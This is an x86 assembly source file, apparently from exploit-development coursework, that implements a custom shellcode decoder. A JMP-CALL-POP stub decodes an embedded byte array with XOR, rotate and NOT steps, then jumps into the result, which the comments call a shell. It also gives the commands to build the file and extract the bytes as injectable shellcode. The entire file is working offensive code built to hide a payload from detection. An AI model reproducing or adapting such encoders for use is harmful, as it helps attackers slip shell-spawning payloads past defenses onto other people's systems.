; Author :  Alessio Parzian
; Filename: shell_encoded.asm

; compile with:
; 	nasm -f elf32 shellcode_encoded.asm
;	ld -o shellcode_encoded shellcode_encoded.o
; extract shellcode with:
; 	objdump -d shellcode_encoded | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

global _start

section .text

	_start:
		jmp short call_shellcode
	
	decoder:
		pop esi
		xor ebx, ebx
		xor ecx, ecx
		xor edx, edx
		mov cl, 0x32 ; change the value based on the length of the encoded shellcode 
	
	decode:
		mov bl, byte [esi]
		xor bl, 0xbb
		and bl, 0xff
		mov dl, byte [esi]
		xor dl, 0xbb
		and dl, 0xff
		rol bl, 0x02
		and bl, 0xff
		ror dl, 0x06
		and bl, dl
		not bl
		mov byte [esi], bl
		inc esi
		loop decode
		; call the decoded shell
		jmp short EncodedShell

	call_shellcode:
		call decoder
		EncodedShell: db 0xbe,0xc2,0xd3,0x08,0xb2,0x66,0xd3,0x06,0x26,0xd9,0xc6,0x26,0xd3,0xc7,0x27,0xc3,0x27,0xd7,0xc6,0x27,0xd1,0xc7,0x08,0x74,0x68,0x86,0x37,0x64,0x7e,0x3c,0xbb,0xbb,0xbb,0x8f,0xdc,0x1e,0xdf,0x8f,0xdc,0x1c,0x98,0x5e,0x14,0xd4,0xd4,0xd4,0xd4,0x94,0x94,0x94,0x94
